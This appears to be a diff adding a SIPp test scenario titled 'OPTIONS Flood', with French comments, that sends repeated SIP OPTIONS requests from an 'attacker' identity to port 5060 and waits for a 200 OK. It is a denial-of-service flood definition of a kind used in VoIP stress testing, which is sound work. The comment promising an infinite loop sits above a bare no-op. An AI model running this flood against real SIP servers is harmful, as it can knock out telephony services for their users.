@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<scenario name="OPTIONS Flood">
+  <!-- Flood massif d’OPTIONS sur le port 5060 -->
+
+  <send retrans="0">
+    <![CDATA[
+    OPTIONS sip:[remote_ip]:5060 SIP/2.0
+    Via: SIP/2.0/UDP [local_ip]:[local_port];branch=[branch]
+    From: <sip:attacker@[local_ip]>;tag=[call_number]
+    To: <sip:[remote_ip]>
+    Call-ID: optflood-[call_number]@[local_ip]
+    CSeq: [cseq] OPTIONS
+    Max-Forwards: 70
+    Content-Length: 0
+    ]]>
+  </send>
+
+  <!-- 200 OK attendu de façon obligatoire (optional="false") -->
+  <recv response="200" optional="false" timeout="200"/>
+  
+  <!-- Boucle infinie -->
+  <nop/>
+</scenario>
